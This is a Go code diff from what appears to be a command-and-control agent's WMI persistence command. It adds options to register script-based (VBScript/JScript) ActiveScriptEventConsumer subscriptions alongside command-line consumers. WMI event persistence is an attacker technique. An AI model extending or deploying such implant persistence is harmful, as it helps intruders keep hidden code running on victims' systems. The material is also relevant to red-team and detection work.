@@ -15,13 +15,35 @@ func (c *WmiPersistCommand) Description() string {
 }
 
 type wmiPersistArgs struct {
-	Action      string `json:"action"`
-	Name        string `json:"name"`
-	Command     string `json:"command"`
-	Trigger     string `json:"trigger"`
-	IntervalSec int    `json:"interval_sec"`
-	ProcessName string `json:"process_name"`
-	Target      string `json:"target"`
+	Action       string `json:"action"`
+	Name         string `json:"name"`
+	Command      string `json:"command"`
+	Trigger      string `json:"trigger"`
+	IntervalSec  int    `json:"interval_sec"`
+	ProcessName  string `json:"process_name"`
+	Target       string `json:"target"`
+	ConsumerType string `json:"consumer_type"`
+	ScriptEngine string `json:"script_engine"`
+}
+
+func (a wmiPersistArgs) isScriptConsumer() bool {
+	return strings.EqualFold(a.ConsumerType, "script")
+}
+
+func (a wmiPersistArgs) resolvedScriptEngine() string {
+	switch strings.ToLower(a.ScriptEngine) {
+	case "jscript":
+		return "JScript"
+	default:
+		return "VBScript"
+	}
+}
+
+func (a wmiPersistArgs) consumerClassName() string {
+	if a.isScriptConsumer() {
+		return "ActiveScriptEventConsumer"
+	}
+	return "CommandLineEventConsumer"
 }
 
 // buildWQLTrigger returns the WQL event query for the given trigger type
@@ -46,7 +68,7 @@ func buildWQLTrigger(trigger string, intervalSec int, processName string) (strin
 // parseWmiPersistArgs handles common parameter parsing and validation
 func parseWmiPersistArgs(task structs.Task) (wmiPersistArgs, *structs.CommandResult) {
 	if task.Params == "" {
-		r := errorResult("Error: parameters required. Actions: install, remove, list")
+		r := errorResult("parameters required. Actions: install, remove, list")
 		return wmiPersistArgs{}, &r
 	}
 	return unmarshalParams[wmiPersistArgs](task)
